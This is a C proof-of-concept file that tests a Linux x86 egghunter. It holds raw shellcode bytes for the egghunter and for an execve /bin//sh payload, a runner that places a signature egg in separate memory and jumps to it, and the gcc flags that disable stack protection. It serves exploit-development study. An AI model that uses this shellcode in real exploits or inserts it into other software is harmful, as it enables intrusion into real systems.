/*
 Egghunter Test/PoC (Linux x86/32 Bits)
 (c) 2017 dabooze / Dilsec

 http://dilsec.wordpress.com
 @dab00ze

 Licensed under CC 3.0 (http://creativecommons.org/licenses/by-sa/3.0/)

 This bit of code simulates a multi-memory environment (egghunter code memory separated from shellcode memory).
 If the the egghunter works, it will successfully find the egg and call the shellcode that's 8 bytes after the
 egg (which is 2x a 4-byte signature).
 
 Generate a elf32 executable with: gcc -z execstack -fno-stack-protector -D_FORTIFY_SOURCE poc.c -o poc -g -ggdb

 Running it should execute /bin//sh (opens a local shell).
*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
 
int (*sc)();
 
char egghunter[] = \
"\x31\xc9\xf7\xe1\xfc\x66\x81\xca\xff\x0f\x42\x6a"
"\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\x89"
"\xd7\xb8\x50\x90\x50\x90\xaf\x75\xe9\xaf\x75\xe6"
"\xff\xe7";
 
 // example shellcode, calls /bin//sh by using the execve syscall
 char shellcode[] = \
 "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
 "\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd"
 "\x80";
 
int main(int argc, char **argv) {
 
    char *egg;
 
    // map some memory for egghunter
    char *ptr = mmap(0, sizeof(egghunter),
            PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
 
    // copy egghunter code to mapped memory
    memcpy(ptr, egghunter, sizeof(egghunter));
 
    // allocate fresh new memory for the egg/shellcode to simulate
    // a different memory location, as often found in exploit situations
    egg = malloc(1024);
 
    // copy 2* the egg's signature to egg memory (right before the shellcode)
    memcpy(egg+0, "\x50\x90\x50\x90", 4);       // 0x90509050 
    memcpy(egg+4, "\x50\x90\x50\x90", 4);       // 0x90509050
 
    // now paste in the the shellcode right after the signature bytes
    memcpy(egg+8, shellcode, sizeof(shellcode));

    // trigger the egghunter
    (void)((void(*)())ptr)();
 
    free(egg);
 
    printf("\n");
 
    return 0;
}